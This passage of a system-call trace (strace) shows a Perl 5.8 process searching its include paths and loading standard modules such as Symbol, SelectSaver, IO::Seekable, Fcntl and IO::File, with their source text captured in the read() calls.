s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
13033 07:45:20.053694 stat64("/etc/perl/Symbol.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053711 stat64("/etc/perl/Symbol.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053724 stat64("/usr/local/lib/perl/5.8.8/Symbol.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053737 stat64("/usr/local/lib/perl/5.8.8/Symbol.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053750 stat64("/usr/local/share/perl/5.8.8/Symbol.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053762 stat64("/usr/local/share/perl/5.8.8/Symbol.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053776 stat64("/usr/lib/perl5/Symbol.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053787 stat64("/usr/lib/perl5/Symbol.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053800 stat64("/usr/share/perl5/Symbol.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053812 stat64("/usr/share/perl5/Symbol.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053824 stat64("/usr/lib/perl/5.8/Symbol.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053869 stat64("/usr/lib/perl/5.8/Symbol.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053883 stat64("/usr/share/perl/5.8/Symbol.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.053909 stat64("/usr/share/perl/5.8/Symbol.pm", {st_mode=S_IFREG|0644, st_size=2099, ...}) = 0
13033 07:45:20.053930 open("/usr/share/perl/5.8/Symbol.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.053944 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.053955 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.053972 read(8, "package Symbol;\n\nBEGIN { require 5.005; }\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(gensym ungensym qualify qualify_to_ref);\n@EXPORT_OK = qw(delete_package geniosym);\n\n$VERSION = \'1.06\';\n\nmy $genpkg = \"Symbol::\";\nmy $genseq = 0;\n\nmy %global = map {$_ => 1} qw(ARGV ARGVOUT ENV INC SIG STDERR STDIN STDOUT);\n\n#\n# Note that we never _copy_ the glob; we just make a ref to it.\n# If we did copy it, then SVf_FAKE would be set on the copy, and\n# glob-specific behaviors (e.g. C<*$ref = \\&func>) wouldn\'t work.\n#\nsub gensym () {\n    my $name = \"GEN\" . $genseq++;\n    my $ref = \\*{$genpkg . $name};\n    delete $$genpkg{$name};\n    $ref;\n}\n\nsub geniosym () {\n    my $sym = gensym();\n    # force the IO slot to be filled\n    select(select $sym);\n    *$sym{IO};\n}\n\nsub ungensym ($) {}\n\nsub qualify ($;$) {\n    my ($name) = @_;\n    if (!ref($name) && index($name, \'::\') == -1 && index($name, \"\'\") == -1) {\n\tmy $pkg;\n\t# Global names: special character, \"^xyz\", or other. \n\tif ($name =~ /^(([^a-z])|(\\^[a-z_]+))\\z/i || $global{$name}) {\n\t    # RGS 2001-11-05 : translate leading ^X to control-char\n\t    $name =~ s/^\\^([a-z_])/\'qq(\\c\'.$1.\')\'/eei;\n\t    $pkg = \"main\";\n\t}\n\telse {\n\t    $pkg = (@_ > 1) ? $_[1] : caller;\n\t}\n\t$name = $pkg . \"::\" . $name;\n    }\n    $name;\n}\n\nsub qualify_to_ref ($;$) {\n    return \\*{ qualify $_[0], @_ > 1 ? $_[1] : caller };\n}\n\n#\n# of Safe.pm lineage\n#\nsub delete_package ($) {\n    my $pkg = shift;\n\n    # expand to full symbol table name if needed\n\n    unless ($pkg =~ /^main::.*::$/) {\n        $pkg = \"main$pkg\"\tif\t$pkg =~ /^::/;\n        $pkg = \"main::$pkg\"\tunless\t$pkg =~ /^main::/;\n        $pkg .= \'::\'\t\tunless\t$pkg =~ /::$/;\n    }\n\n    my($stem, $leaf) = $pkg =~ m/(.*::)(\\w+::)$/;\n    my $stem_symtab = *{$stem}{HASH};\n    return unless defined $stem_symtab and exists $stem_symtab->{$leaf};\n\n    # free all the symbols in the package\n\n    my $leaf_symtab = *{$stem_symtab->{$leaf}}{HASH};\n    foreach my $name (keys %$leaf_symtab) {\n        undef *{$pkg . $name};\n    }\n\n    # delete the symbol table\n\n    %$leaf_symtab = ();\n    delete $stem_symtab->{$leaf};\n}\n\n1;\n", 4096) = 2099
13033 07:45:20.054393 read(8, "", 4096) = 0
13033 07:45:20.054411 close(8)          = 0
13033 07:45:20.054475 stat64("/etc/perl/SelectSaver.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054492 stat64("/etc/perl/SelectSaver.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054506 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054519 stat64("/usr/local/lib/perl/5.8.8/SelectSaver.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054534 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054547 stat64("/usr/local/share/perl/5.8.8/SelectSaver.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054561 stat64("/usr/lib/perl5/SelectSaver.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054573 stat64("/usr/lib/perl5/SelectSaver.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054586 stat64("/usr/share/perl5/SelectSaver.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054599 stat64("/usr/share/perl5/SelectSaver.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054612 stat64("/usr/lib/perl/5.8/SelectSaver.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054625 stat64("/usr/lib/perl/5.8/SelectSaver.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054639 stat64("/usr/share/perl/5.8/SelectSaver.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.054652 stat64("/usr/share/perl/5.8/SelectSaver.pm", {st_mode=S_IFREG|0644, st_size=340, ...}) = 0
13033 07:45:20.054674 open("/usr/share/perl/5.8/SelectSaver.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.054689 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.054701 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.054720 read(8, "package SelectSaver;\n\nour $VERSION = \'1.01\';\n\nrequire 5.000;\nuse Carp;\nuse Symbol;\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new SelectSaver [FILEHANDLE]\';\n    my $fh = select;\n    my $self = bless \\$fh, $_[0];\n    select qualify($_[1], caller) if @_ > 1;\n    $self;\n}\n\nsub DESTROY {\n    my $self = $_[0];\n    select $$self;\n}\n\n1;\n", 4096) = 340
13033 07:45:20.054899 brk(0x81d6000)    = 0x81d6000
13033 07:45:20.054931 read(8, "", 4096) = 0
13033 07:45:20.054943 close(8)          = 0
13033 07:45:20.055359 read(6, "sage: $io->stat()\';\n    stat($_[0]);\n}\n\n################################################\n## State modification functions.\n##\n\nsub autoflush {\n    my $old = new SelectSaver qualify($_[0], caller);\n    my $prev = $|;\n    $| = @_ > 1 ? $_[1] : 1;\n    $prev;\n}\n\nsub output_field_separator {\n    carp \"output_field_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $,;\n    $, = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub output_record_separator {\n    carp \"output_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $\\;\n    $\\ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_record_separator {\n    carp \"input_record_separator is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $/;\n    $/ = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub input_line_number {\n    local $.;\n    () = tell qualify($_[0], caller) if ref($_[0]);\n    my $prev = $.;\n    $. = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_page_number {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $%;\n    $% = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_per_page {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $=;\n    $= = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_lines_left {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $-;\n    $- = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $~;\n    $~ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_top_name {\n    my $old;\n    $old = new SelectSaver qualify($_[0], caller) if ref($_[0]);\n    my $prev = $^;\n    $^ = qualify($_[1], caller) if @_ > 1;\n    $prev;\n}\n\nsub format_line_break_characters {\n    carp \"format_line_break_characters is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $:;\n    $: = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub format_formfeed {\n    carp \"format_formfeed is not supported on a per-handle basis\"\n\tif ref($_[0]);\n    my $prev = $^L;\n    $^L = $_[1] if @_ > 1;\n    $prev;\n}\n\nsub formline {\n    my $io = shift;\n    my $picture = shift;\n    local($^A) = $^A;\n    local($\\) = \"\";\n    formline($picture, @_);\n    print $io $^A;\n}\n\nsub format_write {\n    @_ < 3 || croak \'usage: $io->write( [FORMAT_NAME] )\';\n    if (@_ == 2) {\n\tmy ($io, $fmt) = @_;\n\tmy $oldfmt = $io->format_name($fmt);\n\tCORE::write($io);\n\t$io->format_name($oldfmt);\n    } else {\n\tCORE::write($_[0]);\n    }\n}\n\n# XXX undocumented\nsub fcntl {\n    @_ == 3 || croak \'usage: $io->fcntl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return fcntl($io, $op, $_[2]);\n}\n\n# XXX undocumented\nsub ioctl {\n    @_ == 3 || croak \'usage: $io->ioctl( OP, VALUE );\';\n    my ($io, $op) = @_;\n    return ioctl($io, $op, $_[2]);\n}\n\n# this sub is for compatability with older releases of IO that used\n# a sub called constant to detemine if a constant existed -- GMB\n#\n# The SEEK_* and _IO?BF constants were the only constants at that time\n# any new code should just chech defined(&CONSTANT_NAME)\n\nsub constant {\n    no strict \'refs\';\n    my $name = shift;\n    (($name =~ /^(SEEK_(SET|CUR|END)|_IO[FLN]BF)$/) && defined &{$name})\n\t? &{$name}() : undef;\n}\n\n# so that flush.pl can be deprecated\n\nsub printflush {\n    my $io = shift;\n    my $old;\n    $old = new SelectSaver qualify($io, caller) if ref($io);\n    local $| = 1;\n    if(ref($io)) {\n        print $io @_;\n    }\n    else {\n\tprint @_;\n    }\n}\n\n1;\n", 4096) = 3496
13033 07:45:20.055977 read(6, "", 4096) = 0
13033 07:45:20.055994 close(6)          = 0
13033 07:45:20.056034 stat64("/etc/perl/IO/Seekable.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.056050 stat64("/etc/perl/IO/Seekable.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056064 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.056077 stat64("/usr/local/lib/perl/5.8.8/IO/Seekable.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056092 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.056105 stat64("/usr/local/share/perl/5.8.8/IO/Seekable.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056119 stat64("/usr/lib/perl5/IO/Seekable.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.056131 stat64("/usr/lib/perl5/IO/Seekable.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056145 stat64("/usr/share/perl5/IO/Seekable.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.056157 stat64("/usr/share/perl5/IO/Seekable.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056170 stat64("/usr/lib/perl/5.8/IO/Seekable.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.056183 stat64("/usr/lib/perl/5.8/IO/Seekable.pm", {st_mode=S_IFREG|0644, st_size=686, ...}) = 0
13033 07:45:20.056213 open("/usr/lib/perl/5.8/IO/Seekable.pm", O_RDONLY|O_LARGEFILE) = 6
13033 07:45:20.056228 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab718) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.056240 _llseek(6, 0, [0], SEEK_CUR) = 0
13033 07:45:20.056258 read(6, "#\n\npackage IO::Seekable;\n\nuse 5.006_001;\nuse Carp;\nuse strict;\nour($VERSION, @EXPORT, @ISA);\nuse IO::Handle ();\n# XXX we can\'t get these from IO::Handle or we\'ll get prototype\n# mismatch warnings on C<use POSIX; use IO::File;> :-(\nuse Fcntl qw(SEEK_SET SEEK_CUR SEEK_END);\nrequire Exporter;\n\n@EXPORT = qw(SEEK_SET SEEK_CUR SEEK_END);\n@ISA = qw(Exporter);\n\n$VERSION = \"1.10\";\n$VERSION = eval $VERSION;\n\nsub seek {\n    @_ == 3 or croak \'usage: $io->seek(POS, WHENCE)\';\n    seek($_[0], $_[1], $_[2]);\n}\n\nsub sysseek {\n    @_ == 3 or croak \'usage: $io->sysseek(POS, WHENCE)\';\n    sysseek($_[0], $_[1], $_[2]);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $io->tell()\';\n    tell($_[0]);\n}\n\n1;\n", 4096) = 686
13033 07:45:20.056397 stat64("/etc/perl/Fcntl.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056414 stat64("/etc/perl/Fcntl.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056428 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056440 stat64("/usr/local/lib/perl/5.8.8/Fcntl.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056454 stat64("/usr/local/share/perl/5.8.8/Fcntl.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056467 stat64("/usr/local/share/perl/5.8.8/Fcntl.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056481 stat64("/usr/lib/perl5/Fcntl.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056492 stat64("/usr/lib/perl5/Fcntl.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056505 stat64("/usr/share/perl5/Fcntl.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056517 stat64("/usr/share/perl5/Fcntl.pm", 0xbfcab45c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056530 stat64("/usr/lib/perl/5.8/Fcntl.pmc", 0xbfcab54c) = -1 ENOENT (No such file or directory)
13033 07:45:20.056542 stat64("/usr/lib/perl/5.8/Fcntl.pm", {st_mode=S_IFREG|0644, st_size=3458, ...}) = 0
13033 07:45:20.056563 open("/usr/lib/perl/5.8/Fcntl.pm", O_RDONLY|O_LARGEFILE) = 8
13033 07:45:20.056577 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfcab268) = -1 ENOTTY (Inappropriate ioctl for device)
13033 07:45:20.056588 _llseek(8, 0, [0], SEEK_CUR) = 0
13033 07:45:20.056608 read(8, "package Fcntl;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS, $AUTOLOAD);\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n$VERSION = \"1.05\";\n# Items to export into callers namespace by default\n# (move infrequently used names to @EXPORT_OK below)\n@EXPORT =\n  qw(\n\tFD_CLOEXEC\n\tF_ALLOCSP\n\tF_ALLOCSP64\n\tF_COMPAT\n\tF_DUP2FD\n\tF_DUPFD\n\tF_EXLCK\n\tF_FREESP\n\tF_FREESP64\n\tF_FSYNC\n\tF_FSYNC64\n\tF_GETFD\n\tF_GETFL\n\tF_GETLK\n\tF_GETLK64\n\tF_GETOWN\n\tF_NODNY\n\tF_POSIX\n\tF_RDACC\n\tF_RDDNY\n\tF_RDLCK\n\tF_RWACC\n\tF_RWDNY\n\tF_SETFD\n\tF_SETFL\n\tF_SETLK\n\tF_SETLK64\n\tF_SETLKW\n\tF_SETLKW64\n\tF_SETOWN\n\tF_SHARE\n\tF_SHLCK\n\tF_UNLCK\n\tF_UNSHARE\n\tF_WRACC\n\tF_WRDNY\n\tF_WRLCK\n\tO_ACCMODE\n\tO_ALIAS\n\tO_APPEND\n\tO_ASYNC\n\tO_BINARY\n\tO_CREAT\n\tO_DEFER\n\tO_DIRECT\n\tO_DIRECTORY\n\tO_DSYNC\n\tO_EXCL\n\tO_EXLOCK\n\tO_LARGEFILE\n\tO_NDELAY\n\tO_NOCTTY\n\tO_NOFOLLOW\n\tO_NOINHERIT\n\tO_NONBLOCK\n\tO_RANDOM\n\tO_RAW\n\tO_RDONLY\n\tO_RDWR\n\tO_RSRC\n\tO_RSYNC\n\tO_SEQUENTIAL\n\tO_SHLOCK\n\tO_SYNC\n\tO_TEMPORARY\n\tO_TEXT\n\tO_TRUNC\n\tO_WRONLY\n     );\n\n# Other items we are prepared to export if requested\n@EXPORT_OK = qw(\n\tDN_ACCESS\n\tDN_ATTRIB\n\tDN_CREATE\n\tDN_DELETE\n\tDN_MODIFY\n\tDN_MULTISHOT\n\tDN_RENAME\n\tFAPPEND\n\tFASYNC\n\tFCREAT\n\tFDEFER\n\tFDSYNC\n\tFEXCL\n\tFLARGEFILE\n\tFNDELAY\n\tFNONBLOCK\n\tFRSYNC\n\tFSYNC\n\tFTRUNC\n\tF_GETLEASE\n\tF_GETSIG\n\tF_NOTIFY\n\tF_SETLEASE\n\tF_SETSIG\n\tLOCK_EX\n\tLOCK_MAND\n\tLOCK_NB\n\tLOCK_READ\n\tLOCK_RW\n\tLOCK_SH\n\tLOCK_UN\n\tLOCK_WRITE\n\tO_IGNORE_CTTY\n\tO_NOATIME\n\tO_NOLINK\n\tO_NOTRANS\n\tSEEK_CUR\n\tSEEK_END\n\tSEEK_SET\n\tS_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\tS_IREAD S_IWRITE S_IEXEC\n\tS_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\tS_IROTH S_IWOTH S_IXOTH S_IRWXO\n\tS_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\tS_ISUID S_ISGID S_ISVTX S_ISTXT\n\t_S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t&S_ISREG &S_ISDIR &S_ISLNK &S_ISSOCK &S_ISBLK &S_ISCHR &S_ISFIFO\n\t&S_ISWHT &S_ISENFMT &S_IFMT &S_IMODE\n);\n# Named groups of exports\n%EXPORT_TAGS = (\n    \'flock\'   => [qw(LOCK_SH LOCK_EX LOCK_NB LOCK_UN)],\n    \'Fcompat\' => [qw(FAPPEND FASYNC FCREAT FDEFER FDSYNC FEXCL FLARGEFILE\n\t\t     FNDELAY FNONBLOCK FRSYNC FSYNC FTRUNC)],\n    \'seek\'    => [qw(SEEK_SET SEEK_CUR SEEK_END)],\n    \'mode\'    => [qw(S_ISUID S_ISGID S_ISVTX S_ISTXT\n\t\t     _S_IFMT S_IFREG S_IFDIR S_IFLNK\n\t\t     S_IFSOCK S_IFBLK S_IFCHR S_IFIFO S_IFWHT S_ENFMT\n\t\t     S_IRUSR S_IWUSR S_IXUSR S_IRWXU\n\t\t     S_IRGRP S_IWGRP S_IXGRP S_IRWXG\n\t\t     S_IROTH S_IWOTH S_IXOTH S_IRWXO\n\t\t     S_IREAD S_IWRITE S_IEXEC\n\t\t     S_ISREG S_ISDIR S_ISLNK S_ISSOCK\n\t\t     S_ISBLK S_ISCHR S_ISFIFO\n\t\t     S_ISWHT S_ISENFMT\t\t\n\t\t     S_IFMT S_IMODE\n                  )],\n);\n\nsub S_IFMT  { @_ ? ( $_[0] & _S_IFMT() ) : _S_IFMT()  }\nsub S_IMODE { $_[0] & 07777 }\n\nsub S_ISREG    { ( $_[0] & _S_IFMT() ) == S_IFREG()   }\nsub S_ISDIR    { ( $_[0] & _S_IFMT() ) == S_IFDIR()   }\nsub S_ISLNK    { ( $_[0] & _S_IFMT() ) == S_IFLNK()   }\nsub S_ISSOCK   { ( $_[0] & _S_IFMT() ) == S_IFSOCK()  }\nsub S_ISBLK    { ( $_[0] & _S_IFMT() ) == S_IFBLK()   }\nsub S_ISCHR    { ( $_[0] & _S_IFMT() ) == S_IFCHR()   }\nsub S_ISFIFO   { ( $_[0] & _S_IFMT() ) == S_IFIFO()   }\nsub S_ISWHT    { ( $_[0] & _S_IFMT() ) == S_IFWHT()   }\nsub S_ISENFMT  { ( $_[0] & _S_IFMT() ) == S_IFENFMT() }\n\nsub AUTOLOAD {\n    (my $constname = $AUTOLOAD) =~ s/.*:://;\n    die \"&Fcntl::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n        my (undef,$file,$line) = caller;\n        die \"$error at $file line $line.\\n\";\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Fcntl\', $VERSION;\n\n1;\n", 4096) = 3458
13033 07:45:20.056965 brk(0x81f7000)    = 0x81f7000
13033 07:45:20.057144 read(8, "", 4096) = 0
13033 07:45:20.057159 close(8)          = 0
13033 07:45:20.057228 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
13033 07:45:20.057253 stat64("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
13033 07:45:20.057279 open("/usr/lib/perl/5.8/auto/Fcntl/Fcntl.so", O_RDONLY) = 8
13033 07:45:20.057294 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \10\0\0004\0\0\0\274,\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\274*\0\0\274*\0\0\5\0\0\0\0\20\0\0\1\0\0\0\274*\0\0\274:\0\0\274:\0\0T\1\0\0X\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\320*\0\0\320:\0\0\320:\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0\21\0\0\0\36\0\0\0\0\0\0\0\25\0\0\0\32\0\0\0\24\0\0\0\5\0\0\0\t\0\0\0\0\0\0\0\23\0\0\0\21\0\0\0\34\0\0\0\4\0\0\0\26\0\0\0\0\0\0\0\30\0\0\0\17\0\0\0\27\0\0\0\r\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\v\0\0\0\6\0\0\0\35\0\0\0\7\0\0\0\0\0\0\0\22\0\0\0\31\0\0\0\33\0\0\0\20\0\0\0\16\0\0\0\n\0\0\0\0\0\0\0\f\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\27\0\0\0\2\0\0\0\6\0\0\0\210\0 \1\0\304H\t\27\0\0\0\32\0\0\0\35\0\0\0\356TU\220\272\343\222|CE\325\354.6bx\330qX\34\271\215\361\16\353\323\357\16\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\353\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0j\1\0\0\0\0\0\0\0\0\0\0\20\0\0\0\337\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0u\0\0\0\0\0\0\0", 512) = 512
13033 07:45:20.057397 fstat64(8, {st_mode=S_IFREG|0644, st_size=12412, ...}) = 0
13033 07:45:20.057420 mmap2(NULL, 15380, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d2f000
13033 07:45:20.057434 mmap2(0xb7d32000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x2) = 0xb7d32000
13033 07:45:20.057449 close(8)          = 0
13033 07:45:20.057654 read(6, "", 4096) = 0
13033 07:45:20.057669 close(6)          = 0
13033 07:45:20.057701 stat64("/etc/perl/IO/File.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.057717 stat64("/etc/perl/IO/File.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.057730 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.057743 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.057758 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
13033 07:45:20.057770 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbfcab90c) = -1 ENOENT (No such file or directory)
13033 07:45:20.057784 stat64("/usr/lib/perl5/IO/File.pmc", 0xbfcab9fc) = -1 ENOENT (No such file or directory)
